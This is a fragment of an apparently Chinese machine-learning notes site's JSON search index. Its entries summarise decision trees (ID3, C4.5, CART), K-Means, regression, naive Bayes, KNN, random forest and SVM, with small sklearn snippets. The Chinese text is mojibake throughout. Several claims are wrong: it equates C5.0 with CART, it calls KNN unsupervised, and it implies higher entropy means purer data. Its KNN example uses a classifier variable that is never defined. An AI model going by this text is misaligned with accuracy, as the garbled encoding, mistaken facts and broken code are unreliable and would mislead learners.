‘æ¯æ¬¡å¯¹æ•°æ®é›†è¿›è¡Œåˆ’åˆ†éœ€è¦é€‰æ‹©æœ€ä¼˜çš„åˆ’åˆ†ç‰¹å¾ï¼Œ ID3å°±æ˜¯å¯¹æ¯ä¸ªç‰¹å¾è¿›è¡Œéå†ï¼Œç„¶åè®¡ç®—æŒ‰æ­¤ç‰¹å¾åˆ’åˆ†åå¾—åˆ°çš„ä¿¡æ¯å¢ç›Šï¼Œ é€‰æ‹©å¢ç›Šæœ€å¤§çš„ç‰¹å¾è¿›è¡Œæ•°æ®é›†çš„åˆ’åˆ†ã€‚ç„¶åå†å¯¹æ¯ä¸ªå­æ•°æ®é›†è¿›è¡ŒåŒæ ·çš„åˆ’åˆ†æ“ä½œã€‚ ç¼ºç‚¹ï¼š ID3ä¿¡æ¯å¢ç›Šå‡†åˆ™å¯¹å¯å–å€¼æ•°ç›®è¾ƒå¤šçš„ç‰¹å¾æœ‰æ‰€åå¥½ï¼Œæ¯”å¦‚IDç±»ç‰¹å¾çš„ä¿¡æ¯å¢ç›Šå¯æ¥è¿‘äº1ï¼› åªèƒ½ç”¨äºå¤„ç†ç¦»æ•£åˆ†å¸ƒçš„ç‰¹å¾ï¼Œä¸èƒ½å¤„ç†è¿ç»­å€¼ä¸ç¼ºå¤±å€¼ï¼› åªèƒ½ç”¨äºåˆ†ç±»ã€‚ å†³ç­–æ ‘ç®—æ³•-C4.5 æœ€å¤§åŒ–ä¿¡æ¯å¢ç›Šç‡, åŸºäºä¿¡æ¯å¢ç›Šç‡åšåˆ†ç±»ï¼Œæ˜¯ID3çš„æ”¹è¿›ç‰ˆï¼› C4.5æ˜¯ä¸ºäº†è§£å†³ID3çš„ä¸€ä¸ªç¼ºç‚¹è€Œäº§ç”Ÿçš„ã€‚ ç¼ºç‚¹æ˜¯å•¥ï¼Ÿå¦‚æœæŸä¸ªå±æ€§çš„åˆ†ç±»å¾ˆå¤šï¼Œä¹Ÿå°±æ˜¯åˆ†å‰è¶…å¤šï¼Œé‚£ä¹ˆè¯¥å±æ€§ä¸‹çš„æ ·æœ¬å°±å¾ˆå°‘ï¼Œ æ­¤æ—¶çš„ä¿¡æ¯å¢ç›Šå°±éå¸¸é«˜ï¼ŒID3è¿™ä¸ªæ„£å¤´é’å°±ä¼šè®¤ä¸ºè¿™ä¸ªå±æ€§é€‚åˆç”¨ä½œåˆ’åˆ†ã€‚ æ˜¯ï¼Œå®ƒç¡®å®æ˜¯èƒ½åˆ’åˆ†ï¼Œä½†å–å€¼è¾ƒå¤šçš„å±æ€§ç”¨ä½œåˆ’åˆ†ä¾æ®æ—¶ï¼Œå®ƒçš„æ³›åŒ–èƒ½åŠ›å¼±ï¼Œ æ²¡æ³•å¯¹æ–°æ ·æœ¬æœ‰æ•ˆé¢„æµ‹ï¼Œæ‰€ä»¥C4.5ä¸ä¾é ä¿¡æ¯å¢ç›Šåˆ’åˆ†æ ·æœ¬ï¼Œè€Œæ˜¯ä¾é \"ä¿¡æ¯å¢ç›Šç‡\"ã€‚ ä¸ºäº†å…‹æœID3å€¾å‘äºå–å€¼æ•°ç›®è¾ƒå¤šçš„ç‰¹å¾çš„ç¼ºé™·ï¼Œ C4.5åœ¨ä¿¡æ¯å¢ç›Šçš„åŸºç¡€ä¸Šæ·»åŠ äº†åˆ†æ¯é¡¹ï¼Œå¼•å…¥äº†ä¿¡æ¯å¢ç›Šç‡ï¼Œè®¡ç®—å…¬å¼å¦‚ä¸‹ï¼š åˆ†æ¯é¡¹Haä¼šå¯¹å–å€¼æ•°ç›®è¾ƒå¤šçš„ç‰¹å¾è¿›è¡Œæƒ©ç½šï¼Œ ç‰¹å¾å–å€¼æ•°ç›®è¶Šå¤šï¼ŒHaè¶Šå¤§ï¼Œä¿¡æ¯å¢ç›Šç‡å°±è¶Šå°ã€‚ æ‰€ä»¥å¾ˆå¥½çš„è§£å†³äº†ID3çš„ç¼ºç‚¹1ã€‚ ä¿¡æ¯å¢ç›Šç‡åŒä¿¡æ¯å¢ç›Šï¼Œéƒ½æ˜¯è¶Šå¤§è¶Šå¥½ã€‚ æ³¨è§£ ä¿¡æ¯å¢ç›Šç‡è™½ç„¶è§£å†³äº†å€¾å‘äºå–å€¼è¾ƒå¤§çš„ç‰¹å¾ï¼Œä½†æ˜¯åˆå¼•å…¥äº†å€¾å‘äºå–å€¼è¾ƒå°‘ç‰¹å¾çš„ç¼ºé™·ï¼Œ æ‰€ä»¥å…¶é€‰æ‹©ç‰¹å¾æ—¶ä¸æ˜¯ç›´æ¥é€‰å–ä¿¡æ¯å¢ç›Šç‡æœ€å¤§çš„ç‰¹å¾ï¼Œ è€Œæ˜¯å…ˆä»å€™é€‰ç‰¹å¾ä¸­æ‰¾åˆ°ä¿¡æ¯å¢ç›Šé«˜äºå¹³å‡å€¼çš„ç‰¹å¾ï¼Œå†ä»ä¸­é€‰æ‹©ä½¿å¢ç›Šç‡æœ€é«˜çš„ä½œä¸ºæœ€ä¼˜åˆ’åˆ†ç‰¹å¾ã€‚ ä¼˜ç‚¹ï¼š æ”¹è¿›ID3å€¾å‘äºé€‰æ‹©å–å€¼è¾ƒå¤šçš„ç‰¹å¾çš„ç¼ºç‚¹ï¼› å¯å¤„ç†è¿ç»­å€¼ä¸ç¼ºå¤±å€¼ã€‚ ç¼ºç‚¹ï¼š è·ŸID3ä¸€æ ·åªèƒ½ç”¨äºåˆ†ç±»ï¼› è®¡ç®—é‡è¾ƒå¤§ï¼Œè®¡ç®—ä¿¡æ¯ç†µæœ‰å¤§é‡çš„å¯¹æ•°è¿ç®—ï¼Œä»¥åŠé€‰å–æœ€ä¼˜ç‰¹å¾æ—¶ï¼Œå¯¹è¿ç»­å€¼çš„æ’åºç­‰ã€‚ å†³ç­–æ ‘ç®—æ³•-CART åŸºå°¼ä¸çº¯åº¦, åŸºäºåŸºå°¼ç³»æ•°ï¼Œæ—¢å¯ä»¥åšåˆ†ç±»ä¹Ÿå¯ä»¥åšå›å½’ CARTå†³ç­–æ ‘ï¼ˆClassification and Regression Treeï¼‰ç‹¬ç«‹äºå¦å¤–ä¸¤ç§å†³ç­–æ ‘ï¼Œ ä¸€æ–¹é¢å®ƒä½¿ç”¨åŸºå°¼æŒ‡æ•°ï¼ˆGini Indexï¼‰ä½œä¸ºåˆ’åˆ†ä¾æ®ï¼Œ å¦ä¸€æ–¹é¢å®ƒæ—¢å¯ä»¥åšåˆ†ç±»ï¼Œä¹Ÿå¯ä»¥åšå›å½’ã€‚ Pythonä¸­çš„sklearnå†³ç­–æ ‘æ¨¡å‹å°±æ˜¯é‡‡ç”¨çš„CARTæ¥é€‰æ‹©åˆ†æ”¯çš„ã€‚ åˆ†ç±»æ ‘ (Classification Tree)ï¼šç›®æ ‡æ˜¯åˆ†ç±»æ•°æ®ã€ç¦»æ•£æ•°æ®ã€‚ä¾‹å¦‚ï¼šåŠ¨ç‰©ç§ç±»ã€äººçš„æ€§åˆ«ã€‚ å›å½’æ ‘ (Regression Tree)ï¼šç›®æ ‡æ˜¯è¿ç»­çš„æ•°æ®ã€‚ä¾‹å¦‚ï¼šäººçš„å¹´é¾„ã€æ”¶å…¥ åŸºå°¼æŒ‡æ•°Gini(D) åæ˜ çš„æ˜¯æ•°æ®é›†ä¸­éšæœºæŠ½å–ä¸¤ä¸ªæ ·æœ¬ï¼Œ è€Œä»–ä»¬ç±»åˆ«æ ‡å¿—ä¸ä¸€è‡´çš„æ¦‚ç‡ã€‚ ï¼ˆe.g.ä»100å°é‚®ä»¶ä¸­éšæœºæŠ½ä¸¤ä¸ªï¼Œè€Œè¿™ä¸¤ä¸ªé‚®ä»¶\"æ˜¯åƒåœ¾é‚®ä»¶\"å’Œ\"ä¸æ˜¯åƒåœ¾é‚®ä»¶\"çš„æ¦‚ç‡ï¼‰ åŸºå°¼æŒ‡æ•°è¶Šå°ï¼Œä»£è¡¨æ•°æ®é›†Dçš„çº¯åº¦è¶Šé«˜ã€‚ C5.0åˆç§°ä¸ºCART(åˆ†ç±»å›å½’æ ‘)ï¼ŒC5.0æŠ›å¼ƒäº†ç”¨ä¿¡æ¯ç†µæ¥è¡¡é‡æ•°æ®é›†çš„çº¯å‡€åº¦ï¼Œ ä½¿ç”¨äº†ä¸€ç§æ›´ç®€å•çš„è®¡ç®—æ–¹å¼ï¼Œç§°ä¸ºåŸºå°¼ç³»æ•°ï¼Œå…¶å…¬å¼å¦‚ä¸‹ Gini(D)è¡¨ç¤ºä»Dä¸­éšæœºæŠ½å–ä¸¤ä¸ªæ ·æœ¬ï¼Œè¿™ä¸¤ä¸ªæ ·æœ¬çš„æ ‡ç­¾ä¸ä¸€æ ·çš„æ¦‚ç‡ã€‚ æ¦‚ç‡è¶Šå°ï¼Œè¡¨ç¤ºåŒç±»çš„æ ·æœ¬æ•°è¶Šå¤šï¼Œæ•°æ®é›†Dè¶Šçº¯å‡€ï¼Œè¿™æ€§è´¨ä¸ä¿¡æ¯ç†µè¶Šå¤§æ ·æœ¬è¶Šçº¯å‡€ç›¸åã€‚ C5.0ä¸å†æ˜¯è€ƒé‡åˆ’åˆ†å‰åä¿¡æ¯ç†µçš„å·®è·ï¼Œè€Œæ˜¯åŸºå°¼ç³»æ•°çš„å·®è·ã€‚ C5.0çš„è®¡ç®—è¿‡ç¨‹æ²¡æœ‰å¼•å…¥logå¯¹æ•°è®¡ç®—ï¼Œæ‰€ä»¥å®ƒçš„è®¡ç®—å¤æ‚åº¦è¦ä¼˜äºID3ä¸C4.5ã€‚ ä¼˜ç‚¹ï¼š ä½¿ç”¨ Gini ç³»æ•°æ¥åº¦é‡æ ·æœ¬çº¯å‡€åº¦ï¼Œå‡å°‘äº†å¤§é‡çš„å¯¹æ•°è¿ç®—ï¼› å¯åŒæ—¶ç”¨äºåˆ†ç±»ä¸å›å½’ï¼› ç¼ºç‚¹ï¼š è·ŸID3ä¸€æ ·ï¼Œéƒ½å€¾å‘äºå¤šå–å€¼ç‰¹å¾ã€‚ å‚è€ƒ:: ã€éå¸¸è¯¦ç»†ã€‘é€šä¿—æ˜“æ‡‚çš„è®²è§£å†³ç­–æ ‘ï¼ˆDecision Treeï¼‰ ä¸€æ–‡çœ‹æ‡‚å†³ç­–æ ‘ï¼ˆDecision Treeï¼‰ å†³ç­–æ ‘ï¼ˆDecision Treeï¼‰ï¼ˆä¸‰ç§åŸç†+æ­¥éª¤ï¼‰ ã€Šæœºå™¨å­¦ä¹ ã€‹ä¹‹ æ·±å…¥æµ…å‡ºå†³ç­–æ ‘(åŸç†+ä»£ç )","tags":"AI","url":"/yq-doc-source-docs-AI-Machine-learning-Machine-learning-algorithm-Decision-Tree-algorithm-DECISION-TREE.html","loc":"/yq-doc-source-docs-AI-Machine-learning-Machine-learning-algorithm-Decision-Tree-algorithm-DECISION-TREE.html"},{"title":"é™ç»´ç®—æ³• Dimensional Reduction","text":"åœ¨æœºå™¨å­¦ä¹ å’Œç»Ÿè®¡å­¦é¢†åŸŸï¼Œé™ç»´æ˜¯æŒ‡åœ¨é™å®šæ¡ä»¶ä¸‹ï¼Œé™ä½éšæœºå˜é‡ä¸ªæ•°ï¼Œ å¾—åˆ°ä¸€ç»„\"ä¸ç›¸å…³\"ä¸»å˜é‡çš„è¿‡ç¨‹ï¼Œå¹¶å¯è¿›ä¸€æ­¥ç»†åˆ†ä¸ºç‰¹å¾é€‰æ‹©å’Œç‰¹å¾æå–ä¸¤å¤§æ–¹æ³•ã€‚ ä¸€äº›æ•°æ®é›†å¯èƒ½åŒ…å«è®¸å¤šéš¾ä»¥å¤„ç†çš„å˜é‡ã€‚ ç‰¹åˆ«æ˜¯èµ„æºä¸°å¯Œçš„æƒ…å†µä¸‹ï¼Œç³»ç»Ÿä¸­çš„æ•°æ®å°†éå¸¸è¯¦ç»†ã€‚ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ•°æ®é›†å¯èƒ½åŒ…å«æ•°åƒä¸ªå˜é‡ï¼Œå…¶ä¸­å¤§å¤šæ•°å˜é‡ä¹Ÿå¯èƒ½æ˜¯ä¸å¿…è¦çš„ã€‚ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå‡ ä¹ä¸å¯èƒ½ç¡®å®šå¯¹æˆ‘ä»¬çš„é¢„æµ‹å½±å“æœ€å¤§çš„å˜é‡ã€‚ æ­¤æ—¶ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨é™ç»´ç®—æ³•ï¼Œé™ç»´çš„è¿‡ç¨‹ä¸­ä¹Ÿå¯èƒ½éœ€è¦ç”¨åˆ°å…¶ä»–ç®—æ³•ï¼Œ ä¾‹å¦‚å€Ÿç”¨éšæœºæ£®æ—ï¼Œå†³ç­–æ ‘æ¥è¯†åˆ«æœ€é‡è¦çš„å˜é‡ã€‚","tags":"AI","url":"/yq-doc-source-docs-AI-Machine-learning-Machine-learning-algorithm-Dimensional-Reduction.html","loc":"/yq-doc-source-docs-AI-Machine-learning-Machine-learning-algorithm-Dimensional-Reduction.html"},{"title":"æ¢¯åº¦å¢å¼ºç®—æ³• Gradient Boosting","text":"æ¢¯åº¦å¢å¼ºç®—æ³•ï¼ˆGradient Boostingï¼‰ä½¿ç”¨å¤šä¸ªå¼±ç®—æ³•æ¥åˆ›å»ºæ›´å¼ºå¤§çš„ç²¾ç¡®ç®—æ³•ã€‚ å®ƒä¸ä½¿ç”¨å•ä¸ªä¼°è®¡é‡ä¸åŒï¼Œè€Œæ˜¯ä½¿ç”¨å¤šä¸ªä¼°è®¡é‡åˆ›å»ºä¸€ä¸ªæ›´ç¨³å®šå’Œæ›´å¥å£®çš„ç®—æ³•ã€‚æ¢¯åº¦å¢å¼ºç®—æ³•æœ‰å‡ ç§ï¼š XGBoost â€” ä½¿ç”¨çº¿æ€§å’Œæ ‘ç®—æ³• LightGBM â€” åªä½¿ç”¨åŸºäºæ ‘çš„ç®—æ³• æ¢¯åº¦å¢å¼ºç®—æ³•çš„ç‰¹ç‚¹æ˜¯ç²¾åº¦è¾ƒé«˜ã€‚æ­¤å¤–ï¼ŒLightGBM ç®—æ³•å…·æœ‰ä»¤äººéš¾ä»¥ç½®ä¿¡çš„é«˜æ€§èƒ½ã€‚","tags":"AI","url":"/yq-doc-source-docs-AI-Machine-learning-Machine-learning-algorithm-Gradient-enhancement-algorithm-Gradient-Boosting.html","loc":"/yq-doc-source-docs-AI-Machine-learning-Machine-learning-algorithm-Gradient-enhancement-algorithm-Gradient-Boosting.html"},{"title":"k-å¹³å‡ç®—æ³• K-Means","text":"k-å¹³å‡ç®—æ³•(K-Means)æ˜¯ä¸€ç§æ— ç›‘ç£å­¦ä¹ ç®—æ³•ï¼Œä¸ºèšç±»é—®é¢˜æä¾›äº†ä¸€ç§è§£å†³æ–¹æ¡ˆã€‚ K-Means ç®—æ³•æŠŠ n ä¸ªç‚¹ï¼ˆå¯ä»¥æ˜¯æ ·æœ¬çš„ä¸€æ¬¡è§‚å¯Ÿæˆ–ä¸€ä¸ªå®ä¾‹ï¼‰åˆ’åˆ†åˆ° k ä¸ªé›†ç¾¤ï¼ˆclusterï¼‰ï¼Œ ä½¿å¾—æ¯ä¸ªç‚¹éƒ½å±äºç¦»ä»–æœ€è¿‘çš„å‡å€¼ï¼ˆå³èšç±»ä¸­å¿ƒï¼Œcentroidï¼‰å¯¹åº”çš„é›†ç¾¤ã€‚ é‡å¤ä¸Šè¿°è¿‡ç¨‹ä¸€ç›´æŒç»­åˆ°é‡å¿ƒä¸æ”¹å˜ã€‚","tags":"AI","url":"/yq-doc-source-docs-AI-Machine-learning-Machine-learning-algorithm-K-average-algorithm-K-Means.html","loc":"/yq-doc-source-docs-AI-Machine-learning-Machine-learning-algorithm-K-average-algorithm-K-Means.html"},{"title":"çº¿æ€§å›å½’ç®—æ³• Linear Regression","text":"å›å½’åˆ†æ(Regression Analysis)æ˜¯ç»Ÿè®¡å­¦çš„æ•°æ®åˆ†ææ–¹æ³•ï¼Œ ç›®çš„åœ¨äºäº†è§£ä¸¤ä¸ªæˆ–å¤šä¸ªå˜é‡é—´æ˜¯å¦ç›¸å…³ã€ç›¸å…³æ–¹å‘ä¸å¼ºåº¦ï¼Œ å¹¶å»ºç«‹æ•°å­¦æ¨¡å‹ä»¥ä¾¿è§‚å¯Ÿç‰¹å®šå˜é‡æ¥é¢„æµ‹å…¶å®ƒå˜é‡çš„å˜åŒ–æƒ…å†µã€‚ çº¿æ€§å›å½’ç®—æ³•(Linear Regression)çš„å»ºæ¨¡è¿‡ç¨‹å°±æ˜¯ä½¿ç”¨æ•°æ®ç‚¹æ¥å¯»æ‰¾æœ€ä½³æ‹Ÿåˆçº¿ã€‚ å…¬å¼: y = mx + c å…¶ä¸­ y æ˜¯å› å˜é‡ï¼Œx æ˜¯è‡ªå˜é‡ï¼Œåˆ©ç”¨ç»™å®šçš„æ•°æ®é›†æ±‚ m å’Œ c çš„å€¼ã€‚ çº¿æ€§å›å½’åˆåˆ†ä¸ºä¸¤ç§ç±»å‹ï¼Œå³ ç®€å•çº¿æ€§å›å½’ (simple linear regression)ï¼Œåªæœ‰ 1 ä¸ªè‡ªå˜é‡ï¼› å¤šå˜é‡å›å½’ (multiple regression)ï¼Œè‡³å°‘ä¸¤ç»„ä»¥ä¸Šè‡ªå˜é‡ã€‚","tags":"AI","url":"/yq-doc-source-docs-AI-Machine-learning-Machine-learning-algorithm-Linear-regression-algorithm-Linear-Regression.html","loc":"/yq-doc-source-docs-AI-Machine-learning-Machine-learning-algorithm-Linear-regression-algorithm-Linear-Regression.html"},{"title":"é€»è¾‘å›å½’ç®—æ³• Logistic Regression","text":"é€»è¾‘å›å½’ç®—æ³•(Logistic Regression)ä¸€èˆ¬ç”¨äºéœ€è¦æ˜ç¡®è¾“å‡ºçš„åœºæ™¯ï¼Œå¦‚æŸäº›äº‹ä»¶çš„å‘ç”Ÿ(é¢„æµ‹æ˜¯å¦ä¼šå‘ç”Ÿé™é›¨)ã€‚ é€šå¸¸ï¼Œé€»è¾‘å›å½’ä½¿ç”¨æŸç§å‡½æ•°å°†æ¦‚ç‡å€¼å‹ç¼©åˆ°æŸä¸€ç‰¹å®šèŒƒå›´ã€‚ ä¾‹å¦‚ï¼ŒSigmoid å‡½æ•°(S å‡½æ•°)æ˜¯ä¸€ç§å…·æœ‰ S å½¢æ›²çº¿ã€ç”¨äºäºŒå…ƒåˆ†ç±»çš„å‡½æ•°ã€‚ å®ƒå°†å‘ç”ŸæŸäº‹ä»¶çš„æ¦‚ç‡å€¼è½¬æ¢ä¸º 0, 1 çš„èŒƒå›´è¡¨ç¤º: Y = E &#94; (b0ï¼‹b1 x) / (1 + E &#94; (b0ï¼‹b1 x ) ) ä»¥ä¸Šæ˜¯ä¸€ä¸ªç®€å•çš„é€»è¾‘å›å½’æ–¹ç¨‹ï¼ŒB0ï¼ŒB1æ˜¯å¸¸æ•°ã€‚è¿™äº›å¸¸æ•°å€¼å°†è¢«è®¡ç®—è·å¾—ï¼Œä»¥ç¡®ä¿é¢„æµ‹å€¼å’Œå®é™…å€¼ä¹‹é—´çš„è¯¯å·®æœ€å°ã€‚","tags":"AI","url":"/yq-doc-source-docs-AI-Machine-learning-Machine-learning-algorithm-Logic-regression-algorithm-logistic-regression.html","loc":"/yq-doc-source-docs-AI-Machine-learning-Machine-learning-algorithm-Logic-regression-algorithm-logistic-regression.html"},{"title":"æœ´ç´ è´å¶æ–¯ç®—æ³• Naive Bayes","text":"æœ´ç´ è´å¶æ–¯ç®—æ³•ï¼ˆNaive Bayesï¼‰åŸºäºæ¦‚ç‡è®ºçš„è´å¶æ–¯å®šç†ï¼Œåº”ç”¨éå¸¸å¹¿æ³›ï¼Œä»æ–‡æœ¬åˆ†ç±»ã€åƒåœ¾é‚®ä»¶è¿‡æ»¤å™¨ã€åŒ»ç–—è¯Šæ–­ç­‰ç­‰ã€‚ æœ´ç´ è´å¶æ–¯é€‚ç”¨äºç‰¹å¾ä¹‹é—´çš„ç›¸äº’ç‹¬ç«‹çš„åœºæ™¯ï¼Œä¾‹å¦‚åˆ©ç”¨èŠ±ç“£çš„é•¿åº¦å’Œå®½åº¦æ¥é¢„æµ‹èŠ±çš„ç±»å‹ã€‚ \"æœ´ç´ \"çš„å†…æ¶µå¯ä»¥ç†è§£ä¸ºç‰¹å¾å’Œç‰¹å¾ä¹‹é—´ç‹¬ç«‹æ€§å¼ºã€‚ ä¸æœ´ç´ è´å¶æ–¯ç®—æ³•å¯†åˆ‡ç›¸å…³çš„ä¸€ä¸ªæ¦‚å¿µæ˜¯æœ€å¤§ä¼¼ç„¶ä¼°è®¡(Maximum likelihood estimation)ï¼Œ å†å²ä¸Šå¤§éƒ¨åˆ†çš„æœ€å¤§ä¼¼ç„¶ä¼°è®¡ç†è®ºä¹Ÿéƒ½æ˜¯åœ¨è´å¶æ–¯ç»Ÿè®¡ä¸­å¾—åˆ°å¤§å‘å±•ã€‚ ä¾‹å¦‚ï¼Œå»ºç«‹äººå£èº«é«˜æ¨¡å‹ï¼Œå¾ˆéš¾æœ‰äººåŠ›ä¸ç‰©åŠ›å»ç»Ÿè®¡å…¨å›½æ¯ä¸ªäººçš„èº«é«˜ï¼Œ ä½†æ˜¯å¯ä»¥é€šè¿‡é‡‡æ ·ï¼Œè·å–éƒ¨åˆ†äººçš„èº«é«˜ï¼Œç„¶åé€šè¿‡æœ€å¤§ä¼¼ç„¶ä¼°è®¡æ¥è·å–åˆ†å¸ƒçš„å‡å€¼ä¸æ–¹å·®ã€‚ æ³¨è§£ Naive Bayes is called naive because it assumes that each input variable is independent.","tags":"AI","url":"/yq-doc-source-docs-AI-Machine-learning-Machine-learning-algorithm-Naive-Bayes.html","loc":"/yq-doc-source-docs-AI-Machine-learning-Machine-learning-algorithm-Naive-Bayes.html"},{"title":"æœ€è¿‘é‚»å±…/k-è¿‘é‚»ç®—æ³•(K-Nearest Neighbors,KNN)","text":"æ³¨è§£ å±äºæ— ç›‘ç£å­¦ä¹  KNNç®—æ³•æ˜¯ä¸€ç§åŸºäºå®ä¾‹çš„å­¦ä¹ ï¼Œæˆ–è€…æ˜¯å±€éƒ¨è¿‘ä¼¼å’Œå°†æ‰€æœ‰è®¡ç®—æ¨è¿Ÿåˆ°åˆ†ç±»ä¹‹åçš„æƒ°æ€§å­¦ä¹ ã€‚ ç”¨æœ€è¿‘çš„é‚»å±…ï¼ˆkï¼‰æ¥é¢„æµ‹æœªçŸ¥æ•°æ®ç‚¹ã€‚ k å€¼æ˜¯é¢„æµ‹ç²¾åº¦çš„ä¸€ä¸ªå…³é”®å› ç´ ï¼Œæ— è®ºæ˜¯åˆ†ç±»è¿˜æ˜¯å›å½’ï¼Œè¡¡é‡é‚»å±…çš„æƒé‡éƒ½éå¸¸æœ‰ç”¨ï¼Œè¾ƒè¿‘é‚»å±…çš„æƒé‡æ¯”è¾ƒè¿œé‚»å±…çš„æƒé‡å¤§ KNN ç®—æ³•çš„ç¼ºç‚¹æ˜¯å¯¹æ•°æ®çš„å±€éƒ¨ç»“æ„éå¸¸æ•æ„Ÿã€‚ è®¡ç®—é‡å¤§ï¼Œéœ€è¦å¯¹æ•°æ®è¿›è¡Œè§„èŒƒåŒ–å¤„ç†ï¼Œä½¿æ¯ä¸ªæ•°æ®ç‚¹éƒ½åœ¨ç›¸åŒçš„èŒƒå›´ã€‚ ä¸¾ä¾‹: from sklearn import datasets from sklearn.neighbors import KNeighborsClassifier #digit dataset from sklearn digits = datasets.load_digits() #set training set x, y = digits.data[:-1], digits.target[:-1] #train model clf.fit(x,y) #predict y_pred = clf.predict([digits.data[-1]]) y_true = digits.target[-1] y_pred, y_true å»¶ä¼¸ï¼šKNN çš„ä¸€ä¸ªç¼ºç‚¹æ˜¯ä¾èµ–äºæ•´ä¸ªè®­ç»ƒæ•°æ®é›†ï¼Œ å­¦ä¹ å‘é‡é‡åŒ–ï¼ˆLearning Vector Quantizationï¼ŒLVQ)æ˜¯ä¸€ç§ç›‘ç£å­¦ä¹ çš„äººç¥ç»ç½‘ç»œç®—æ³•ï¼Œ å…è®¸ä½ é€‰æ‹©è®­ç»ƒå®ä¾‹ã€‚ LVQ ç”±æ•°æ®é©±åŠ¨ï¼Œæœç´¢è·ç¦»å®ƒæœ€è¿‘çš„ä¸¤ä¸ªç¥ç»å…ƒï¼Œ å¯¹äºåŒç±»ç¥ç»å…ƒé‡‡å–æ‹‰æ‹¢ï¼Œå¼‚ç±»ç¥ç»å…ƒé‡‡å–æ’æ–¥ï¼Œæœ€ç»ˆå¾—åˆ°æ•°æ®çš„åˆ†å¸ƒæ¨¡å¼ã€‚ å¦‚æœåŸºäº KNN å¯ä»¥è·å¾—è¾ƒå¥½çš„æ•°æ®é›†åˆ†ç±»æ•ˆæœï¼Œ åˆ©ç”¨ LVQ å¯ä»¥å‡å°‘å­˜å‚¨è®­ç»ƒæ•°æ®é›†å­˜å‚¨è§„æ¨¡ã€‚ å…¸å‹çš„å­¦ä¹ çŸ¢é‡é‡åŒ–ç®—æ³•æœ‰LVQ1ã€LVQ2å’ŒLVQ3ï¼Œå°¤ä»¥LVQ2çš„åº”ç”¨æœ€ä¸ºå¹¿æ³›ã€‚","tags":"AI","url":"/yq-doc-source-docs-AI-Machine-learning-Machine-learning-algorithm-Near-neighboring-K-Nearest-Neighbors-(KNN).html","loc":"/yq-doc-source-docs-AI-Machine-learning-Machine-learning-algorithm-Near-neighboring-K-Nearest-Neighbors-(KNN).html"},{"title":"éšæœºæ£®æ—ç®—æ³• Random Forest","text":"å±äºé›†æˆå­¦ä¹  éšæœºæ£®æ—ç®—æ³•ï¼ˆRandom Forestï¼‰çš„åç§°ç”± 1995 å¹´ç”±è´å°”å®éªŒå®¤æå‡ºçš„random decision forests è€Œæ¥ï¼Œ æ­£å¦‚å®ƒçš„åå­—æ‰€è¯´çš„é‚£æ ·ï¼Œéšæœºæ£®æ—å¯ä»¥çœ‹ä½œä¸€ä¸ªå†³ç­–æ ‘çš„é›†åˆã€‚ éšæœºæ£®æ—ä¸­æ¯æ£µå†³ç­–æ ‘ä¼°è®¡ä¸€ä¸ªåˆ†ç±»ï¼Œè¿™ä¸ªè¿‡ç¨‹ç§°ä¸º\"æŠ•ç¥¨ï¼ˆvoteï¼‰\"ã€‚ ç†æƒ³æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬æ ¹æ®æ¯æ£µå†³ç­–æ ‘çš„æ¯ä¸ªæŠ•ç¥¨ï¼Œé€‰æ‹©æœ€å¤šæŠ•ç¥¨çš„åˆ†ç±»ã€‚ å¯ä»¥å‚è€ƒæ–‡æ¡£: https://www.stat.berkeley.edu/~breiman/randomforest2001.pdf æœ¬åœ°æ–‡æ¡£: ../../../../resources/pdf/randomforest2001.pdf","tags":"AI","url":"/yq-doc-source-docs-AI-Machine-learning-Machine-learning-algorithm-Random-Forest.html","loc":"/yq-doc-source-docs-AI-Machine-learning-Machine-learning-algorithm-Random-Forest.html"},{"title":"æ”¯æŒå‘é‡æœºç®—æ³•(Support Vector Machine,SVM)","text":"æ”¯æŒå‘é‡æœº/ç½‘ç»œç®—æ³•(SVM)å±äºåˆ†ç±»å‹ç®—æ³•ã€‚ SVMæ¨¡å‹å°†å®ä¾‹è¡¨ç¤ºä¸ºç©ºé—´ä¸­çš„ç‚¹ï¼Œå°†ä½¿ç”¨ä¸€æ¡ç›´çº¿åˆ†éš”æ•°æ®ç‚¹ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæ”¯æŒå‘é‡æœºéœ€è¦å¯¹è¾“å…¥æ•°æ®è¿›è¡Œå®Œå…¨æ ‡è®°ï¼Œ ä»…ç›´æ¥é€‚ç”¨äºä¸¤ç±»ä»»åŠ¡ï¼Œåº”ç”¨å°†å¤šç±»ä»»åŠ¡éœ€è¦å‡å°‘åˆ°å‡ ä¸ªäºŒå…ƒé—®é¢˜ ä¸¾ä¾‹: from sklearn import svm, datasets #digit dataset from sklearn digits = datasets.load_digits() #create the Support Vector Classifier clf = svm.SVC(gamma = 0.001, C = 100) #set training set x, y = digits.data[:-1], digits.target[:-1] #train model clf.fit(x, y) #predict y_pred = clf. predict([digits.data[-1]]) y_true = digits.target[-1] y_pred, y_true","tags":"AI","url":"/yq-doc-source-docs-AI-Machine-learning-Machine-learning-algorithm-Support-vector-machine-algorithm-(SVM).html","loc":"/yq-doc-source-docs-AI-Machine-learning-Machine-learning-algorithm-Support-vector-machine-algorithm-(SVM).html"},{"title":"æœºå™¨å­¦ä¹ ç®—æ³•","text":"æœºå™¨å­¦ä¹ ç®—æ³•å¤§è‡´å¯ä»¥åˆ†ä¸ºä¸‰ç±»ï¼š ç›‘ç£å­¦ä¹ ç®—æ³• (Supervised Algorithms) åœ¨ç›‘ç£å­¦ä¹ è®­ç»ƒè¿‡ç¨‹ä¸­ï¼Œå¯ä»¥ç”±è®­ç»ƒæ•°æ®é›†å­¦åˆ°æˆ–å»ºç«‹ä¸€ä¸ªæ¨¡å¼(å‡½æ•° / learning model)ï¼Œ å¹¶ä¾æ­¤æ¨¡å¼æ¨æµ‹æ–°çš„å®ä¾‹ã€‚ è¯¥ç®—æ³•è¦æ±‚ç‰¹å®šçš„è¾“å…¥/è¾“å‡ºï¼Œé¦–å…ˆéœ€è¦å†³å®šä½¿ç”¨å“ªç§æ•°æ®ä½œä¸ºèŒƒä¾‹ã€‚ ä¾‹å¦‚ï¼Œæ–‡å­—è¯†åˆ«åº”ç”¨ä¸­ä¸€ä¸ªæ‰‹å†™çš„å­—ç¬¦ï¼Œæˆ–ä¸€è¡Œæ‰‹å†™æ–‡å­—ã€‚ 